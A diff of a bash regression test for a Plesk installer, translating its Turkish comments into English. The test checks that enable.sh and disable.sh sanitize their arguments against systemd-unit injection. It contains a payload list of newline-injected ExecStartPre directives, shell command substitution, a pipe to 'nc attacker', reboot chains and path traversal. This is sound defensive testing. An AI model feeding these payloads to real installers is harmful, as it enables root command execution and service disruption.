@@ -1,18 +1,18 @@
 #!/usr/bin/env bash
-# LOOK — Plesk installer enjeksiyon-regresyon guard'ı (AĞSIZ / Plesk-GEREKTİRMEZ)
+# LOOK — Plesk installer injection-regression guard (NO NETWORK / does NOT NEED Plesk)
 #
-# Neyi korur: memory'deki privesc bug sınıfı — enable.sh, DOMAIN/SCRIPT/DOC_ROOT
-# arglarını TIRNAKSIZ heredoc ile systemd unit'ine yazıyor; sanitizasyon olmadan
-# gömülü satır-sonu içeren bir arg, unit'e kendi direktifini (ExecStartPre=...)
-# enjekte edip 'sudo systemctl restart' ile ROOT komut koşturur. disable.sh ise
-# SVC_NAME'i 'sudo systemctl stop'a veriyor (arbitrary-servis DoS + path-injection).
+# What it protects: the privesc bug class — enable.sh writes the DOMAIN/SCRIPT/DOC_ROOT
+# args into the systemd unit with an UNQUOTED heredoc; without sanitization an arg with an
+# embedded line end injects its own directive (ExecStartPre=...) into the unit and
+# runs a ROOT command via 'sudo systemctl restart'. disable.sh passes SVC_NAME to
+# 'sudo systemctl stop' (arbitrary-service DoS + path-injection).
 #
-# Bu guard GERÇEK KAYNAKTAN çıkarır: enable.sh/disable.sh içindeki 'tr -cd' beyaz
-# listesini ve case-guard'larını source'tan grep'ler. Biri sanitizasyonu zayıflatırsa
-# (tr satırını kaldırma / charset genişletme / case guard silme) test KIRMIZI olur.
+# This guard EXTRACTS FROM THE REAL SOURCE: it greps the 'tr -cd' whitelist
+# and the case guards in enable.sh/disable.sh from the source. If someone weakens the sanitization
+# (removing the tr line / widening the charset / deleting a case guard) the test goes RED.
 #
-# Çalıştırma:  bash cpp/tests/_plesk_inject_test.sh
-# CI-feasible: yalnız bash + coreutils (tr/grep/sed). Plesk, ağ, root GEREKMEZ.
+# Run:  bash cpp/tests/_plesk_inject_test.sh
+# CI-feasible: only bash + coreutils (tr/grep/sed). NO Plesk, network or root needed.
 
 set -u
 HERE="$(cd "$(dirname "$0")" && pwd)"
@@ -26,8 +26,8 @@ fail() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=1; }
 [ -f "$ENABLE" ]  || { echo "enable.sh bulunamadı: $ENABLE"; exit 2; }
 [ -f "$DISABLE" ] || { echo "disable.sh bulunamadı: $DISABLE"; exit 2; }
 
-# --- Kaynaktan sanitizasyon charset'ini ÇIKAR (test source'a bağlı kalsın) ---
-# Satır kalıbı:  DOMAIN=$(printf '%s' "$DOMAIN" | tr -cd 'A-Za-z0-9.-')
+# --- EXTRACT the sanitization charset from the source (so the test stays tied to the source) ---
+# Line pattern:  DOMAIN=$(printf '%s' "$DOMAIN" | tr -cd 'A-Za-z0-9.-')
 extract_charset() { # <file> <varname>
     sed -n "s/^[[:space:]]*$2=\$(printf '%s' \"\$$2\" | tr -cd '\([^']*\)').*/\1/p" "$1" | head -1
 }
@@ -41,23 +41,23 @@ echo "== 1) Sanitizasyon satırları kaynakta MEVCUT mu (sessiz-kaldırma guard'
 [ -n "$SCRIPT_CS" ]  && pass "enable.sh SCRIPT tr -cd '$SCRIPT_CS'"   || fail "enable.sh SCRIPT tr -cd satırı YOK"
 [ -n "$DIS_SVC_CS" ] && pass "disable.sh SVC_NAME tr -cd '$DIS_SVC_CS'" || fail "disable.sh SVC_NAME tr -cd satırı YOK"
 
-# Yeni satır ("\n") içeren gerçek payload'lar — printf ile üretilir.
+# Real payloads containing a newline ("\n") — produced with printf.
 PAYLOADS=(
-  "look.com"                                   # temiz (kontrol)
-  $'look.com\nExecStartPre=/bin/touch /tmp/pwn'  # SATIR-SONU unit enjeksiyonu (asıl privesc)
+  "look.com"                                   # clean (control)
+  $'look.com\nExecStartPre=/bin/touch /tmp/pwn'  # LINE-END unit injection (the actual privesc)
   $'look.com\n[Service]\nExecStart=/bin/sh -c reboot'
-  'look.com; touch /tmp/pwn'                   # komut ayırıcı
-  'look.com$(touch /tmp/pwn)'                  # komut ikamesi
+  'look.com; touch /tmp/pwn'                   # command separator
+  'look.com$(touch /tmp/pwn)'                  # command substitution
   'look.com`touch /tmp/pwn`'                   # backtick
-  'look.com && reboot'                         # && zinciri
+  'look.com && reboot'                         # && chain
   'look.com | nc attacker 9'                   # pipe
   '../../etc/systemd/system/evil'              # traversal
   $'look.com\r\nExecStart=/evil'               # CRLF
 )
 
-# Bir değerin systemd-unit satırına GÜVENLE gömülebilir olması: satır-sonu YOK +
-# kabuk/unit'i bozacak metakarakter YOK. tr beyaz-listesi bunu doğal sağlar.
-has_dangerous() { # <string>  -> 0 (tehlikeli var), 1 (temiz)
+# A value being SAFELY embeddable in a systemd-unit line: NO line end +
+# NO metacharacters that would break the shell/unit. The tr whitelist guarantees this naturally.
+has_dangerous() { # <string>  -> 0 (dangerous present), 1 (clean)
     printf '%s' "$1" | LC_ALL=C grep -q '[^A-Za-z0-9._/-]' && return 0
     case "$1" in *$'\n'*|*$'\r'*) return 0;; esac
     return 1
@@ -66,7 +66,7 @@ has_dangerous() { # <string>  -> 0 (tehlikeli var), 1 (temiz)
 echo "== 2) enable.sh DOMAIN sanitizasyonu enjeksiyonu ÖLDÜRÜYOR mu =="
 for p in "${PAYLOADS[@]}"; do
     clean="$(printf '%s' "$p" | tr -cd "$DOMAIN_CS")"
-    # Rendered unit satırı: Description=LOOK FastCGI - <clean>  (tek satır kalmalı)
+    # Rendered unit line: Description=LOOK FastCGI - <clean>  (must stay a single line)
     lines="$(printf 'Description=LOOK FastCGI - %s\n' "$clean" | wc -l | tr -d ' ')"
     label="$(printf '%s' "$p" | tr '\n\r' '__')"
     if has_dangerous "$clean"; then
@@ -79,7 +79,7 @@ for p in "${PAYLOADS[@]}"; do
 done
 
 echo "== 3) enable.sh SCRIPT: tr metakarakteri strip + '..'/prefix case-guard'ları var =="
-# SCRIPT charset '/' ve '.' içerir → '..' tr'den GEÇER; ekstra case-guard şart.
+# The SCRIPT charset includes '/' and '.' → '..' PASSES tr; an extra case-guard is required.
 grep -Eq 'case[[:space:]]+"\$SCRIPT"[[:space:]]+in[[:space:]]+\*\.\.\*' "$ENABLE" \
     && pass "SCRIPT '..' traversal case-guard mevcut" \
     || fail "SCRIPT '..' traversal case-guard KAYIP (tr '..'yi geçirir!)"
@@ -104,7 +104,7 @@ for p in $'sshd\nreboot' 'look-x;rm' 'look-../../evil' 'mariadb'; do
                            || pass "SVC metakarakter strip: [$label] -> [$clean]"
 done
 
-# --- POZİTİF KONTROL: sanitizasyonu KALDIR → privesc payload'ı GEÇER → guard bunu görür ---
+# --- POSITIVE CONTROL: REMOVE the sanitization → the privesc payload PASSES → the guard sees it ---
 echo "== 5) POZİTİF KONTROL (sanitizasyon bozuk olsaydı test kırmızı olurdu) =="
 evil=$'look.com\nExecStartPre=/bin/touch /tmp/pwn'
 raw_lines="$(printf 'Description=LOOK FastCGI - %s\n' "$evil" | wc -l | tr -d ' ')"
